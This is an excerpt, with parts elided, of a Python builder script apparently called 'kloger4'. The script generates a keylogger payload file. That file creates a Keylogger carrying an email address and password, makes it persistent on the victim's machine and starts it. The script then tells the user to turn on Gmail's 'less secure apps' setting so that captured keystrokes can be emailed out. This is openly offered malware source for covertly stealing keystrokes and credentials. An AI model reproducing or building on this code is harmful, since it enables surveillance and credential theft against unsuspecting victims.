...
def get_arguments():
    parser = argparse.ArgumentParser(description='kloger4')
...
def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        ...
        file.write("klogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("klogger.become_persistent()\n")
        file.write("klogger.start()\n")
...
print("\n\n---- you must allow less secure applications into your gmail account")
print("This is the  link to do it ----------- https://myaccount.google.com/lesssecureapps --------------------")
